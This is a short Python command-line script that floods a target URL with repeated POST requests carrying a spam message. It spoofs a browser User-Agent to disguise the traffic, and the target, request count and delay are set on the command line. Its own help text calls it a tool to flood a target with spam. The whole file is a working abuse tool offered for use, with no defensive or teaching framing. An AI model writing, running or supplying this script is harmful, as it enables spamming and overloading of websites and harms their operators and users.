import argparse
import requests
import time

def flood(url, count, delay):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    for i in range(count):
        data = {'message': f'This is a spam message from a bot'}
        response = requests.post(url, headers=headers, data=data)

        time.sleep(delay)  # Add a delay between each request

def main():
    parser = argparse.ArgumentParser(description='Flood a target URL with spam messages.')
    parser.add_argument('url', help='The target URL to flood.')
    parser.add_argument('count', type=int, help='The number of requests to send.')
    parser.add_argument('delay', type=float, help='The delay time between each request in seconds.')

    args = parser.parse_args()

    flood(args.url, args.count, args.delay)

if __name__ == '__main__':
    main()